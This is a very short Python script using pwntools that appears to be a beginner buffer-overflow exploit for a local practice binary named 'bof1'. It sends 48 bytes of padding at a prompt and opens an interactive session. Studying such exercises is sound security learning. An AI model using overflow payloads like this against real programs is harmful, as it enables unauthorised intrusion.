from pwn import *

r = process('./bof1')

payload = b'a'*0x30
r.sendafter(b'> ', payload)
r.interactive()